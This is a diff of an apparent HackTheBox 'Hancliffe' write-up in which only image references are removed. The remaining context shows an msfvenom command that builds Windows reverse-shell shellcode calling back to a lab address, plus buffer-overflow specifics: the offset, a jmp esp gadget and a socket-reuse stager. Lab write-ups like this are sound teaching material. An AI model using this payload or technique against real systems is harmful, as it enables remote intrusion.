@@ -3,10 +3,6 @@ title: "Hancliffe"
 date: 2026-12-21 07:00:00 -0500
 categories: [HackTheBox, Windows]
 tags: [hackthebox, hard, buffer-overflow, socket-reuse, binary-exploitation, reverse-engineering, msfvenom]
-image:
-    path: /assets/Images/hancliffe-002_foothold_shell.png
-    width: 300
-    height: 300
 description: "A custom network application on port 9999 trusts a hard-coded login and copies user input into a fixed stack buffer with strcpy. We recover the obfuscated credentials from the binary, overflow the buffer, and use a socket-reuse stager to slip a full reverse-shell payload through the program's own recv() call — landing a privileged shell straight from the network."
 ---
 
@@ -78,7 +74,6 @@ The reverse-shell shellcode is generated as raw bytes (no framework, just the pa
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=9999 EXITFUNC=thread -b "\x00" -f python -v shellcode
 ```
 
-![msfvenom shellcode](/assets/Images/hancliffe-001_exploit_msfvenom.png)
 
 The overflow overwrites the saved return address at offset **66**, and a `jmp esp` gadget at `0x719023a8` redirects execution onto the stack. The catch: the space at ESP is tiny — far too small for a full payload. The fix is **socket reuse**: jump backward (`\xeb\xb8`) into a small hand-written stub that calls the program's own `recv()` (at `0x719082ac`) to pull the real shellcode into a larger buffer over the connection that is already open, then runs it.
 
@@ -103,7 +98,6 @@ Microsoft Windows [Version 10.0.19043.1266]
 C:\Windows\system32>whoami
 ```
 
-![reverse shell](/assets/Images/hancliffe-002_foothold_shell.png)
 
 ## User flag
 
